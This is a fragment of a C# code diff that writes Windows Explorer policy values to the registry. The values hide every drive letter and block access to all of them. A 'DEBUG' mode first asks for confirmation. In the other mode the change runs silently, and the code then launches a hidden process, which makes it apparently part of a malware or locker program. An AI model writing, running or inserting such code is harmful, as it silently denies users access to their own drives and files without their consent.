-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
-                editKey.Close();
+                if (MainThread.Mode == 1)
+                {
+                    if (MessageBox.Show("HIDE DRIVES AND DISALLOW ACCESS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    {
+                        editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                        editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
+                        editKey.Close();
+                        editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                        editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
+                        editKey.Close();
+                    }
+                }
+                else
+                {
+                    editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                    editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
+                    editKey.Close();
+                    editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                    editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
+                    editKey.Close();
+                }
 
                 Process ScriptProcess = new Process();
                 ScriptProcess.StartInfo.CreateNoWindow = true;
